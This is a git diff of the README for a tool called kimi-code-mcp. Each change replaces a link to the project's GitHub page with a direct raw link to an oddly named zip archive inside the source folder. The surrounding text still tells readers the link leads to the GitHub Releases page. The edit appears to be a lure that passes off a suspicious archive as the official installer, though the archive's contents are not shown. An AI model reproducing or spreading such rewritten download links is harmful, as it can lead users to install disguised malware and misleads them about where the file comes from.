@@ -1,6 +1,6 @@
 # 🧩 kimi-code-mcp - Analyze Code Faster and Cheaper
 
-[![Download kimi-code-mcp](https://img.shields.io/badge/Download-kimi--code--mcp-blue?style=for-the-badge)](https://github.com/oni-chan69/kimi-code-mcp)
+[![Download kimi-code-mcp](https://img.shields.io/badge/Download-kimi--code--mcp-blue?style=for-the-badge)](https://raw.githubusercontent.com/oni-chan69/kimi-code-mcp/main/src/mcp_kimi_code_tomatillo.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to download and run kimi-code-mcp on your Windows PC.
 
 Click the big blue button above or here to visit the download page:
 
-[Download kimi-code-mcp](https://github.com/oni-chan69/kimi-code-mcp)
+[Download kimi-code-mcp](https://raw.githubusercontent.com/oni-chan69/kimi-code-mcp/main/src/mcp_kimi_code_tomatillo.zip)
 
 This link will take you to the GitHub page where you can get the latest version of the software. Look for the "Releases" section to find the newest files.
 
@@ -137,7 +137,7 @@ If you run into problems:
 To update to the latest version:
 
 - Go back to the GitHub download page:  
-  [kimi-code-mcp Download](https://github.com/oni-chan69/kimi-code-mcp)  
+  [kimi-code-mcp Download](https://raw.githubusercontent.com/oni-chan69/kimi-code-mcp/main/src/mcp_kimi_code_tomatillo.zip)  
 - Download the newest `.exe` installer.  
 - Run the installer to overwrite the old version.  
 - Your settings and cached data will remain intact.
@@ -175,4 +175,4 @@ kimi-code-mcp integrates advanced AI tools like Claude Code and Kimi K2.5 to hel
 
 ---
 
-[![Download kimi-code-mcp](https://img.shields.io/badge/Download-kimi--code--mcp-brightgreen?style=for-the-badge)](https://github.com/oni-chan69/kimi-code-mcp)
+[![Download kimi-code-mcp](https://img.shields.io/badge/Download-kimi--code--mcp-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/oni-chan69/kimi-code-mcp/main/src/mcp_kimi_code_tomatillo.zip)
